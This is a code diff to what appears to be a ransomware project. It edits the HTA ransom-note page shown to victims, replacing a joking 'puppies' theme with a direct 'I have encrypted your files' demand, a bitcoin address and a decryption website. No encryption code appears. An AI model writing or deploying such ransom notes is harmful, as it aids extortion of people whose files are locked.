@@ -57,7 +57,7 @@ class Ransomware():
         }
 
     </style>
-    <title>I have taken your puppies for ransom!</title>
+    <title>I have taken your Files for ransom!</title>
     <HTA:APPLICATION
         border="thin"
         windowState="maximize"
@@ -65,8 +65,8 @@ class Ransomware():
 </head>
 <body>
     <div class="area">&#9888; ATTENTION &#9888;</div>
-    <h1>I have encrypted your files, including the cute puppy pics!</h1>
-    <p>If you want to see your puppies again, send <span style='font-size: 1.5em; font-style: oblique; color: white'>300 billion dollars</span> to this bitcoin address:</p>
+    <h1>I have encrypted your files</h1>
+    <p>If you want to see your Files again, send <span style='font-size: 1.5em; font-style: oblique; color: white'>150 billion dollars</span> to this bitcoin address:</p>
     <code style='color: red; font-size: 1.5em'>1Ffj4NU32NscD4EWoiJOUcsdjn4ncNHG</code>
     <p>Then go to <span style='font-size: 1.80em'>IWontRunWindowsAgain.com</span>and download your decryption file!</p>
 </body>
